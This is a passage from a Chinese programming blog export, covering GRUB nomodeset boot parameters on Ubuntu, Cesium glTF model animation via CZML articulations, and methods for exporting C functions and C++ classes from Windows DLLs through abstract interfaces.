<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo gedit &#x2F;etc&#x2F;default&#x2F;grub</span><br></pre></td></tr></table></figure>

<p>然后将nomodeset选项添加到 GRUB_CMDLINE_LINUX_DEFAULT:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GRUB_DEFAULT&#x3D;0</span><br><span class="line">GRUB_HIDDEN_TIMEOUT&#x3D;0</span><br><span class="line">GRUB_HIDDEN_TIMEOUT_QUIET&#x3D;true</span><br><span class="line">GRUB_TIMEOUT&#x3D;5</span><br><span class="line">GRUB_DISTRIBUTOR&#x3D;&#96;lsb_release -i -s 2&gt; &#x2F;dev&#x2F;null || echo Debian&#96;</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet splash nomodeset&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>最后更显grub启动文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure>

<h1 id="参数含义"><a href="#参数含义" class="headerlink" title="参数含义"></a>参数含义</h1><p>附内核显示参数的含义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nomodeset </span><br><span class="line">不载入所有关于显示卡的驱动</span><br><span class="line"></span><br><span class="line">nouveau.modeset&#x3D;0 </span><br><span class="line">关闭nvidia显卡的驱动，反之&#x3D;1为开启</span><br><span class="line"></span><br><span class="line">i915.modeset&#x3D;0 </span><br><span class="line">关闭Intel显卡的驱动，挺好奇对于Intel内显会有什么影响</span><br><span class="line"></span><br><span class="line">xforcevesa或radeon.modeset&#x3D;0 xforcevesa </span><br><span class="line">跟AMD显卡(ATI)有关的设定，我猜也是关闭</span><br><span class="line"></span><br><span class="line">acpi&#x3D;off </span><br><span class="line">回归旧时代，电源相关设定，OS无法控管，交给bios处理</span><br><span class="line">acpi功能失效，有不少硬体上奇怪的问题，可以用这参数解决</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/29209412" target="_blank" rel="noopener">Ubuntu16.04–64位安装及使用中出现的问题</a>,by 一部电影.</li>
<li><a href="https://medium.com/caesars-study-review-on-web-development/acpi-osi-linux-nomodeset%E6%98%AF%E4%BB%80%E9%BA%BC%E6%84%8F%E6%80%9D-%E5%8A%9F%E8%83%BD-42d8e2c444c3" target="_blank" rel="noopener">acpi_osi=linux、 nomodeset是什么意思? 功能?</a>, by 峰Caesar.</li>
<li><a href="https://askubuntu.com/questions/38780/how-do-i-set-nomodeset-after-ive-already-installed-ubuntu" target="_blank" rel="noopener">How do I set ‘nomodeset’ after I’ve already installed Ubuntu?</a>,by askubuntu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Cesium支持GLTF动画研究</title>
    <url>/2020/10/04/Cesium%E6%94%AF%E6%8C%81GLTF%E5%8A%A8%E7%94%BB%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p>Cesium在很早之前就支持GLTF模型动画，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var czml &#x3D; [</span><br><span class="line">  &#123;</span><br><span class="line">    id: &quot;document&quot;,</span><br><span class="line">    name: &quot;CZML Model&quot;,</span><br><span class="line">    version: &quot;1.0&quot;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: &quot;aircraft model&quot;,</span><br><span class="line">    name: &quot;Cesium Air&quot;,</span><br><span class="line">    position: &#123;</span><br><span class="line">      cartographicDegrees: [-77, 37, 10000],</span><br><span class="line">    &#125;,</span><br><span class="line">    model: &#123;</span><br><span class="line">      gltf: &quot;..&#x2F;SampleData&#x2F;models&#x2F;CesiumAir&#x2F;Cesium_Air.glb&quot;,</span><br><span class="line">      scale: 2.0,</span><br><span class="line">      minimumPixelSize: 128,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">var viewer &#x3D; new Cesium.Viewer(&quot;cesiumContainer&quot;, &#123;</span><br><span class="line">  shouldAnimate: true,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">var dataSourcePromise &#x3D; viewer.dataSources.add(</span><br><span class="line">  Cesium.CzmlDataSource.load(czml)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>这种方法存在一定局限性，只能支持全局动画，不能控制动画的起止。但最近版本中，Cesium进行了一定改进，可以支持在一定程度上控制GLTF动画了。示例代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var czml &#x3D; [</span><br><span class="line">  &#123;</span><br><span class="line">    id: &quot;document&quot;,</span><br><span class="line">    name: &quot;CZML Model&quot;,</span><br><span class="line">    version: &quot;1.0&quot;,</span><br><span class="line">    clock: &#123;</span><br><span class="line">      interval: &quot;2019-06-01T16:00:00Z&#x2F;2019-06-01T16:10:00Z&quot;,</span><br><span class="line">      currentTime: &quot;2019-06-01T16:00:00Z&quot;,</span><br><span class="line">      multiplier: 60,</span><br><span class="line">      range: &quot;LOOP_STOP&quot;,</span><br><span class="line">      step: &quot;SYSTEM_CLOCK_MULTIPLIER&quot;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: &quot;test model&quot;,</span><br><span class="line">    name: &quot;Cesium Air&quot;,</span><br><span class="line">    position: &#123;</span><br><span class="line">      cartographicDegrees: [-77, 37, 10000],</span><br><span class="line">    &#125;,</span><br><span class="line">    model: &#123;</span><br><span class="line">      gltf: &quot;https:&#x2F;&#x2F;assets.agi.com&#x2F;models&#x2F;launchvehicle.glb&quot;,</span><br><span class="line">      scale: 2.0,</span><br><span class="line">      minimumPixelSize: 128,</span><br><span class="line">      runAnimations: false,</span><br><span class="line">      articulations: &#123;</span><br><span class="line">        &quot;Fairing Open&quot;: &#123;</span><br><span class="line">          epoch: &quot;2019-06-01T16:00:00Z&quot;,</span><br><span class="line">          number: [0, 0, 600, 120],</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Fairing Separate&quot;: &#123;</span><br><span class="line">          epoch: &quot;2019-06-01T16:00:00Z&quot;,</span><br><span class="line">          number: [0, 0, 400, -50],</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Fairing Drop&quot;: &#123;</span><br><span class="line">          epoch: &quot;2019-06-01T16:00:00Z&quot;,</span><br><span class="line">          interpolationAlgorithm: &quot;LAGRANGE&quot;,</span><br><span class="line">          interpolationDegree: 2,</span><br><span class="line">          number: [0, 0, 80, 0, 100, 0, 120, -1, 600, -120],</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">var viewer &#x3D; new Cesium.Viewer(&quot;cesiumContainer&quot;, &#123;</span><br><span class="line">  shouldAnimate: true,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">var dataSourcePromise &#x3D; viewer.dataSources.add(</span><br><span class="line">  Cesium.CzmlDataSource.load(czml)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">dataSourcePromise</span><br><span class="line">  .then(function (dataSource) &#123;</span><br><span class="line">    viewer.trackedEntity &#x3D; dataSource.entities.getById(&quot;test model&quot;);</span><br><span class="line">  &#125;)</span><br><span class="line">  .otherwise(function (error) &#123;</span><br><span class="line">    console.error(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>这段示例代码的原理还有待分析，我将launchvehicle.glb导入blender 2.90中，但并没有看到上述代码中的三段动画。按照链接<a href="https://community.cesium.com/t/model-articulations-number-variable/10000" target="_blank" rel="noopener">Model Articulations “Number” variable</a>的说法，这三段动画是通过GLTF扩展实现。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://community.cesium.com/t/model-articulations-number-variable/10000" target="_blank" rel="noopener">Model Articulations “Number” variable</a>,by cesium.</li>
<li><a href="https://www.khronos.org/files/gltf20-reference-guide.pdf" target="_blank" rel="noopener">glTF 2.0 Quick Reference Guide </a>,by KhronosGroup.</li>
<li><a href="https://github.com/KhronosGroup/glTF" target="_blank" rel="noopener">glTF</a>,by KhronosGroup.</li>
<li><a href="https://sandcastle.cesium.com/?src=CZML%20Model%20Articulations.html&label=All" target="_blank" rel="noopener">Cesium Model Articulations</a>,by cesium.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>DLL导出类和函数</title>
    <url>/2018/06/15/DLL%E5%AF%BC%E5%87%BA%E7%B1%BB%E5%92%8C%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>最近研究在DLL中导出类，探寻最佳的DLL导出类的方法和技术。把整个过程记录一下，防止遗忘。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h2><p>动态链接库（英语：Dynamic-link library，缩写为DLL）是微软公司在微软视窗操作系统中实现共享函数库概念的一种实现方式。这些库函数的扩展名是.DLL、.OCX（包含ActiveX控制的库）或者.DRV（旧式的系统驱动程序)。</p>
<p>所谓动态链接，就是把一些经常会共用的代码（静态链接的OBJ程序库）制作成DLL档，当可执行文件调用到DLL档内的函数时，Windows操作系统才会把DLL档加载存储器内，DLL档本身的结构就是可执行档，当程序有需求时函数才进行链接。通过动态链接方式，存储器浪费的情形将可大幅降低。静态链接库则是直接链接到可执行文件。</p>
<h2 id="编写方法"><a href="#编写方法" class="headerlink" title="编写方法"></a>编写方法</h2><p>使用DLL导出C函数或全局变量很简单，具体代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 下列 ifdef 块是创建使从 DLL 导出更简单的</span><br><span class="line">&#x2F;&#x2F; 宏的标准方法。此 DLL 中的所有文件都是用命令行上定义的 DLLDEMO_EXPORTS</span><br><span class="line">&#x2F;&#x2F; 符号编译的。在使用此 DLL 的</span><br><span class="line">&#x2F;&#x2F; 任何其他项目上不应定义此符号。这样，源文件中包含此文件的任何其他项目都会将</span><br><span class="line">&#x2F;&#x2F; DLLDEMO_API 函数视为是从 DLL 导入的，而此 DLL 则将用此宏定义的</span><br><span class="line">&#x2F;&#x2F; 符号视为是被导出的。</span><br><span class="line"></span><br><span class="line">#ifdef DLLDEMO_EXPORTS</span><br><span class="line">#define DLLDEMO_API __declspec(dllexport)</span><br><span class="line">#else</span><br><span class="line">#define DLLDEMO_API __declspec(dllimport)</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; extern DLLDEMO_API int nDllDemo;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不使用extern &quot;C&quot;将导致函数名字改编</span><br><span class="line">DLLDEMO_API int fnDllDemo(int);</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; DLLDEMO_API int fnExternCDllDemo(int);</span><br></pre></td></tr></table></figure>
<h2 id="运行时通知DLL进程-线程加载"><a href="#运行时通知DLL进程-线程加载" class="headerlink" title="运行时通知DLL进程/线程加载"></a>运行时通知DLL进程/线程加载</h2><p>进程/线程加载时，可以通过DllMain函数通知DLL相关信息，提供对应处理的机会。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL WINAPI DLLMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID fImpLoad)</span><br><span class="line">&#123;</span><br><span class="line">  switch(fdwReason)</span><br><span class="line">  &#123; </span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        &#x2F;&#x2F;当这个DLL第一次被映射到了这个进程的地址空间时。DLLMain函数的返回值为FALSE，说明DLL的初始化没有成功，系统就会终结整个进程，去掉所有文件映象，之后显示一个对话框告诉用户进程不能启动。</span><br><span class="line">    break;</span><br><span class="line">    case DLL_THREAD_ATTACH: </span><br><span class="line">        &#x2F;&#x2F;一个线程被创建，新创建的线程负责执行这次的DllMain函数。系统不会让进程已经存在的线程以DLL_THREAD_ATTACH的值来调用DllMain函数。主线程永远不会以DLL_THREAD_ATTACH的值来调用DllMain函数。系统是顺序调用DllMain函数的，一个线程执行完DllMain函数才会让另外一个线程执行DllMain函数。</span><br><span class="line">    break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">       &#x2F;&#x2F;如果线程调用了ExitThread来结束线程（线程函数返回时，系统也会自动调用ExitThread）。线程调用了TerminateThread，系统就不会用值DLL_THREAD_DETACH来调用所有DLL的DllMain函数。</span><br><span class="line">    break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        &#x2F;&#x2F;这个DLL从进程的地址空间中解除映射。如果进程的终结是因为调用了TerminateProcess，系统就不会用DLL_PROCESS_DETACH来调用DLL的DllMain函数。这就意味着DLL在进程结束前没有机会执行任何清理工作。</span><br><span class="line">    break;</span><br><span class="line">  &#125;</span><br><span class="line">  return(TRUE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="DLL的静态调用方法"><a href="#DLL的静态调用方法" class="headerlink" title="DLL的静态调用方法"></a>DLL的静态调用方法</h2><p>采用静态调用方法，DLL最终将打包到生成的EXE中。静态调用方法步骤如下<sup>[2]</sup>：</p>
<ol>
<li>把你的youApp.DLL拷到你目标工程(需调用youApp.DLL的工程)的Debug目录下;</li>
<li>把你的youApp.lib拷到你目标工程(需调用youApp.DLL的工程)目录下;</li>
<li>把你的youApp.h(包含输出函数的定义)拷到你目标工程(需调用youApp.DLL的工程)目<br>录下;</li>
<li>打开你的目标工程选中工程,选择Visual C++的Project主菜单的Settings菜单;</li>
<li>执行第4步后，VC将会弹出一个对话框，在对话框的多页显示控件中选择Link页。然<br>后在Object/library modules输入框中输入:youApp.lib</li>
<li>选择你的目标工程Head Files加入：youApp.h文件;</li>
<li>最后在你目标工程(*.cpp,需要调用DLL中的函数)中包含你的:#include “youApp.h”</li>
</ol>
<h2 id="DLL的动态调用方法"><a href="#DLL的动态调用方法" class="headerlink" title="DLL的动态调用方法"></a>DLL的动态调用方法</h2><p>动态调用DLL的步骤：  </p>
<ol>
<li>创建一个函数指针，其指针数据类型要与调用的DLL引出函数相吻合。</li>
<li>通过Win32 API函数LoadLibrary()显式的调用DLL，此函数返回DLL的实例句柄。</li>
<li>通过Win32 API函数GetProcAddress()获取要调用的DLL的函数地址, 把结果赋给自定义函数的指针类型。</li>
<li>使用函数指针来调用DLL函数。</li>
<li>最后调用完成后，通过Win32 API函数FreeLibrary()释放DLL函数。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModule &#x3D; LoadLibrary(_T(&quot;DllDemo.dll&quot;));</span><br><span class="line">	typedef int(*TYPE_fnDllDemo) (int);&#x2F;&#x2F;定义函数指针  </span><br><span class="line">	typedef int(*TYPE_fnExternCDllDemo) (int);&#x2F;&#x2F;定义函数指针  </span><br><span class="line">	&#x2F;&#x2F;创建类对象</span><br><span class="line">	CDllDemo* pCDllDemo &#x3D; (CDllDemo*)malloc(sizeof(CDllDemo));</span><br><span class="line"></span><br><span class="line">	TYPE_fnDllDemo fnDllDemo &#x3D; (TYPE_fnDllDemo)GetProcAddress(hModule, &quot;?fnDllDemo@@YAHH@Z&quot;);</span><br><span class="line">	int *nDllDemo &#x3D; (int *)GetProcAddress(hModule, &quot;nDllDemo&quot;);</span><br><span class="line">	TYPE_fnExternCDllDemo fnExternCDllDemo &#x3D; (TYPE_fnExternCDllDemo)GetProcAddress(hModule, &quot;fnExternCDllDemo&quot;);</span><br><span class="line">	</span><br><span class="line">	if (pCDllDemo !&#x3D; NULL)</span><br><span class="line">		&#x2F;&#x2F; printf(&quot;pCDllDemo-&gt;Max(32,42) &#x3D; %d\n&quot;, pCDllDemo-&gt;Max(32, 42));&#x2F;&#x2F;Dll导出类的调用太麻烦，因为DLL本来就是为C函数服务设计的。</span><br><span class="line">	if (fnDllDemo !&#x3D; NULL)</span><br><span class="line">		printf(&quot;fnDllDemo(32) &#x3D; %d\n&quot;, fnDllDemo(32));</span><br><span class="line">	if (nDllDemo !&#x3D; NULL)</span><br><span class="line">		printf(&quot;*nDllDemo &#x3D; %d\n&quot;, *nDllDemo);</span><br><span class="line">	if (fnExternCDllDemo !&#x3D; NULL)</span><br><span class="line">		printf(&quot;fnExternCDllDemo(22) &#x3D; %d\n&quot;, fnExternCDllDemo(22));</span><br><span class="line">	_tsystem(_T(&quot;pause&quot;));</span><br><span class="line">	FreeLibrary(hModule);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="COM技术"><a href="#COM技术" class="headerlink" title="COM技术"></a>COM技术</h2><p>COM主要是一套给C/C++用的接口，当然为了微软的野心，它也被推广到了VB、Delphi以及其他一大堆奇奇怪怪的平台上。它主要为了使用dll发布基于interface的接口。我们知道dll的接口是为了C设计的，它导出的基本都是C的函数，从原理上来说，将dll加载到内存之后，会告诉你一组函数的地址，你自己call进去就可以调用相应的函数<sup>[3]</sup>。  </p>
<p>但是对于C++来说这个事情就头疼了，现在假设你有一个类，我们知道使用一个类的第一步是创建这个类：new MyClass()。这里直接就出问题了，new方法通过编译器计算MyClass的大小来分配相应的内存空间，但是如果库升级了，相应的类可能会增加新的成员，大小就变了，那么使用旧的定义分配出来的空间就不能在新的库当中使用。 </p>
<p>要解决这问题，我们必须在dll当中导出一个CreateObject的方法，用来代替构造函数，然后返回一个接口。然而，接口的定义在不同版本当中也是有可能会变化的，为了兼容以前的版本同时也提供新功能，还需要让这个对象可以返回不同版本的接口。接口其实是一个只有纯虚函数的C++类，不过对它进行了一些改造来兼容C和其他一些编程语言。 </p>
<p>在这样改造之后，出问题的还有析构过程~MyClass()或者说delete myClass，因为同一个对象可能返回了很多个接口，有些接口还在被使用，如果其中一个被人delete了，其他接口都会出错，所以又引入了引用计数，来让许多人可以共享同一个对象。  </p>
<p>其实到此为止也并不算是很奇怪的技术，我们用C++有的时候也会使用Factory方法来代替构造函数实现某些特殊的多态，也会用引用计数等等。COM技术的奇怪地方在于微软实在是脑洞太大了，它们构造了一个操作系统级别的Factory，规定所有人的Interface都统一用UUID来标识，以后想要哪个Interface只要报出UUID来就行了。这样甚至连链接到特定的dll都省了。  </p>
<p>这就好比一个COM程序员，只要他在Windows平台上，调用别的库就只要首先翻一下魔导书，查到了一个用奇怪文字写的“Excel = {xxx-xxx-xxxx…}”的记号，然后它只要对着空中喊一声：“召唤，Excel！CoCreateInstance, {xxx-xxx-xxxx…}”然后呼的从魔法阵里面窜出来了一个怪物，它长什么样我们完全看不清，因为这时候它的类型是IUnknow，这是脑洞奇大无比的微软为所有接口设计的一个基类。</p>
<p>我们需要进一步要求它变成我们能控制的接口形态，于是我们再喊下一条指令：“变身，Excel 2003形态！QueryInterface, {xxx-xxx-xxxx…}”QueryInterface使用的是另一个UUID，用来表示不同版本的接口。于是怪物就变成了我们需要的Excel 2003接口，虽然我们不知道它实际上是2003还是2007还是更高版本。等我们使唤完这只召唤兽，我们就会对它说“回去吧，召唤兽！Release！”但是它不一定听话，因为之前给它的命令也许还没有执行完，它会忠诚地等到执行完再回去，当然我们并不关心这些细节。  </p>
<p>微软大概会觉得自己设计出了软件史上最完美的二进制接口，从今以后所有的第三方库都可以涵盖在这套接口之下。然而历史的车轮是无情的，它碾过那些自以为是的人的速度总是会比想象的更快。Java的直接基于类的接口被广泛应用，开发使用起来远远来的简单，即便偶尔出点问题大家也都想办法解决了，事实证明程序员并不愿意花10倍的编写代码的时间来解决二进制库的版本兼容问题，他们更愿意假装没看见。很快微软也抄了一个.NET托管dll的方案出来，于是纯的二进制接口COM就慢慢被抛弃了。  </p>
<p>COM，OLE，ActiveX，OCX，VBScript，历史不会忘记你们的，如果历史忘了，我替历史记住你们。安息吧。</p>
<h1 id="DLL导出类"><a href="#DLL导出类" class="headerlink" title="DLL导出类"></a>DLL导出类</h1><p>借鉴COM技术，这里直接给出DLL到处类的成熟方法，可有效避免DLL地狱问题。具体结构为：</p>
<p>导出类是一个派生类，派生自一个抽象类——都是纯虚函数。使用者需要知道这个抽象类的结构。DLL最少只需要提供一个用于获取类对象指针的接口。使用者跟DLL提供者共用一个抽象类的头文件，使用者依赖于DLL的东西很少，只需要知道抽象类的接口，以及获取对象指针的导出函数，对象内存空间的申请是在DLL模块中做的，释放也在DLL模块中完成,最后记得要调用释放对象的函数。</p>
<p>这种方式比较好，通用，产生的DLL没有特定环境限制。借助了C++类的虚函数。一般都是采用这种方式。除了对DLL导出类有好处外，采用接口跟实现分离，可以使得工程的结构更清晰，使用者只需要知道接口，而不需要知道实现。</p>
<p>具体代码如下：</p>
<ol>
<li><p>DLL导出类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;DLL导出类头文件MatureApproach.h，与DLL使用者共享</span><br><span class="line">#ifdef MATUREAPPROACH_EXPORTS</span><br><span class="line">#define MATUREAPPROACH_API __declspec(dllexport)</span><br><span class="line">#else</span><br><span class="line">#define MATUREAPPROACH_API __declspec(dllimport)</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">class IExport </span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">	virtual void Hi() &#x3D; 0;</span><br><span class="line">	virtual void Test() &#x3D; 0; </span><br><span class="line">	virtual void Release() &#x3D; 0;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; MATUREAPPROACH_API IExport* _stdcall CreateExportObj();</span><br><span class="line">extern &quot;C&quot; MATUREAPPROACH_API void _stdcall DestroyExportObj(IExport* pExport);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;DLL导出接口函数的实现MatureApproach.cpp</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;MatureApproach.h&quot;</span><br><span class="line">#include &quot;ExportClassImpl.h&quot;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">					 )</span><br><span class="line">&#123;</span><br><span class="line">	switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	case DLL_PROCESS_ATTACH:</span><br><span class="line">	case DLL_THREAD_ATTACH:</span><br><span class="line">	case DLL_THREAD_DETACH:</span><br><span class="line">	case DLL_PROCESS_DETACH:</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MATUREAPPROACH_API IExport* APIENTRY CreateExportObj()</span><br><span class="line">&#123;</span><br><span class="line">	return new ExportImpl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;这里不能直接delete pExport，因为没有把IExport的析构函数定义为虚函数</span><br><span class="line">MATUREAPPROACH_API void  APIENTRY DestroyExportObj(IExport* pExport)</span><br><span class="line">&#123;</span><br><span class="line">	pExport-&gt;Release();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>DLL导出类的具体实现</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;DLL导出类头文件ExportClassImpl.h</span><br><span class="line">#include &quot;MatureApproach.h&quot;</span><br><span class="line"></span><br><span class="line">class ExportImpl : public IExport</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">	virtual void Hi();</span><br><span class="line">	virtual void Test();</span><br><span class="line">	virtual void Release();</span><br><span class="line">	~ExportImpl();</span><br><span class="line">private:</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;DLL导出类的实现ExportClassImpl.cpp</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;ExportClassImpl.h&quot;</span><br><span class="line"></span><br><span class="line">void ExportImpl::Hi()</span><br><span class="line">&#123;</span><br><span class="line">	wcout &lt;&lt; L&quot;Hello World&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ExportImpl::Test()</span><br><span class="line">&#123;</span><br><span class="line">	wcout &lt;&lt; L&quot;Hi cswuyg&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ExportImpl::Release()</span><br><span class="line">&#123;</span><br><span class="line">	delete this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ExportImpl::~ExportImpl()</span><br><span class="line">&#123;</span><br><span class="line">	cout &lt;&lt; &quot;Release OK&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Dll导出C-类的3种方式"><a href="#Dll导出C-类的3种方式" class="headerlink" title="Dll导出C++类的3种方式"></a>Dll导出C++类的3种方式</h1><h2 id="Using-pure-C-（纯C语言方式）"><a href="#Using-pure-C-（纯C语言方式）" class="headerlink" title="Using pure C （纯C语言方式）"></a>Using pure C （纯C语言方式）</h2><p>这种方式类似与Win32的窗口句柄，用户将句柄作为参数传递给函数，并对对象执行各种操作。存在以下缺点：</p>
<ol>
<li>调用创建对象函数的时候编译器无法判断类型是否匹配</li>
<li>需要手动调用Release函数，一旦忘记则会造成内存泄露</li>
<li>如果导出的函数的参数支持除基本数据类型以外的其他类型的参数（例如：class），则也得为这些类型提供接口。</li>
</ol>
<h2 id="Using-a-regular-C-class-（C-直接导出类）"><a href="#Using-a-regular-C-class-（C-直接导出类）" class="headerlink" title="Using a regular C++ class （C++直接导出类）"></a>Using a regular C++ class （C++直接导出类）</h2><p>缺点：</p>
<ol>
<li>这种方式虽然简单易用，但是局限性很大，而且后期维护会很麻烦，除了导出的东西太多、使用者对类的实现依赖太多之外，还有其它问题：必须保证使用同一种编译器。导出类的本质是导出类里的函数，因为语法上直接导出了类，没有对函数的调用方式、重命名进行设置，导致了产生的dll并不通用。</li>
<li>Dll地狱问题:</li>
</ol>
<h2 id="Using-an-abstract-C-interface-（使用抽象接口方式）"><a href="#Using-an-abstract-C-interface-（使用抽象接口方式）" class="headerlink" title="Using an abstract C++ interface （使用抽象接口方式）"></a>Using an abstract C++ interface （使用抽象接口方式）</h2><p>C++抽象接口（仅包含纯虚函数且不包含数据成员的C++类）同时兼顾以下两个方面：与对象无关的纯净接口，以及方便的的面向对象的调用方式。</p>
<p><strong>推荐使用该种方式导出类库。</strong></p>
<p>优点：</p>
<ul>
<li>导出的C++类可以通过抽象接口与任何C++编译器一起使用。</li>
<li>DLL的C运行时库和客户端彼此独立。因为资源获取和释放完全发生在DLL模块内部，客户端不受DLL内部改变的影响。</li>
<li>实现了真正的模块分离。可以重新设计和重建生成的DLL模块，而不会影响项目的其余部分。</li>
<li>如果需要，可以将DLL模块轻松转换为成熟的COM模块。</li>
</ul>
<p>缺点：</p>
<ul>
<li><p>创建新对象实例并将其删除需要显式函数调用。但是，智能指针可以解决。</p>
</li>
<li><p>抽象接口方法不能返回或接受常规C++对象作为参数。它是A内置类型（如int，double，char*等）或另一抽象接口。它与C接口的限制相同。</p>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/动态链接库" target="_blank" rel="noopener">动态链接库</a>, by wikipedia</li>
<li><a href="http://www.cnblogs.com/micro-chen/p/5937428.html" target="_blank" rel="noopener">C++调用DLL有两种方法——静态调用和动态调用</a>，by 特洛伊-Micro</li>
<li><a href="https://www.zhihu.com/question/49433640/answer/115952604" target="_blank" rel="noopener">怎么通俗的解释COM组件？</a>, by 灵剑.</li>
<li><a href="http://www.cnblogs.com/cswuyg/archive/2011/10/06/DLL2.html" target="_blank" rel="noopener">编写DLL所学所思(2)——导出类</a>，by 烛秋.</li>
<li><a href="http://gcc.gnu.org/wiki/Visibility" target="_blank" rel="noopener">Visibility</a>,by Niall Douglas.</li>
<li><a href="https://medium.com/fcamels-notes/linux-%E7%B7%A8%E8%AD%AF-shared-library-%E7%9A%84%E6%96%B9%E6%B3%95%E5%92%8C%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A0%85-cb35844ef331" target="_blank" rel="noopener">Linux 編譯 shared library 的方法和注意事項</a>,by fcamel.</li>
<li><a href="http://abcdxyzk.github.io/blog/2014/11/06/compiler-gcc-lib/" target="_blank" rel="noopener">GCC制作Library–shared部分相当不错</a>,by kk.</li>
<li><a href="https://bbs.pediy.com/thread-262105.htm" target="_blank" rel="noopener">[原创]Dll导出C++类的3种方式(多干货) </a>,by Jmsrwt.</li>
<li><a href="https://www.cnblogs.com/huzongzhe/p/6735189.html" target="_blank" rel="noopener">C++类库开发详解</a>,by 奔跑的小河.</li>
<li><a href="https://www.cnblogs.com/lsgsanxiao/p/11235867.html" target="_blank" rel="noopener">C++ DLL导出类 知识大全</a>,by 三小.</li>
<li><a href="https://stackoverflow.com/questions/4145605/stdvector-needs-to-have-dll-interface-to-be-used-by-clients-of-class-xt-war" target="_blank" rel="noopener">std::vector needs to have dll-interface to be used by clients of class ‘X<T> warning</a>,by stackoverflow.</li>
<li><a href="https://www.zhihu.com/question/409152087/answer/1362253047" target="_blank" rel="noopener">C++的dll库，采用动态调用更好还是静态调用更好？</a>,by Eleven.</li>
</ol>
